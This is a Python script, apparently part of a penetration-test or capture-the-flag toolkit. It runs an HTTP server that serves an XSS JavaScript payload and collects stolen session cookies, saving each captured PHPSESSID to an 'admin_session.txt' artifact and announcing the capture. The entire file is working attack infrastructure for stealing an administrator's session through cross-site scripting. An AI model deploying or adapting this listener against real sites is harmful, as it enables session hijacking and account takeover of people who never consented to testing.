#!/usr/bin/env python3
"""Capture XSS callbacks (js-ran, cookie?SESSID)."""
import http.server
import os
import sys
from datetime import datetime
from urllib.parse import urlparse, parse_qs

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
ART = os.path.join(os.path.dirname(__file__), "..", "artifacts")
os.makedirs(ART, exist_ok=True)
LOG = os.path.join(ART, "xss_capture.log")
SESSION_FILE = os.path.join(ART, "admin_session.txt")


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        line = f"[{datetime.now().isoformat()}] {self.address_string()} {fmt % args}"
        print(line)
        with open(LOG, "a") as f:
            f.write(line + "\n")

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/xss.js":
            js_path = os.path.join(os.path.dirname(__file__), "xss.js")
            data = open(js_path, "rb").read()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return
        if path.startswith("/cookie"):
            qs = parse_qs(urlparse(self.path).query)
            sess = qs.get("cookie", [path.split("?")[-1] if "?" in self.path else ""])[0]
            if not sess and "?" in self.path:
                sess = self.path.split("cookie?", 1)[-1]
            if sess and sess != "NOMATCH":
                with open(SESSION_FILE, "w") as f:
                    f.write(sess)
                print(f"[+] CAPTURED PHPSESSID: {sess}")
        self.send_response(404)
        self.end_headers()

    def do_HEAD(self):
        self.do_GET()


if __name__ == "__main__":
    print(f"[*] Listening on 0.0.0.0:{PORT}")
    http.server.HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
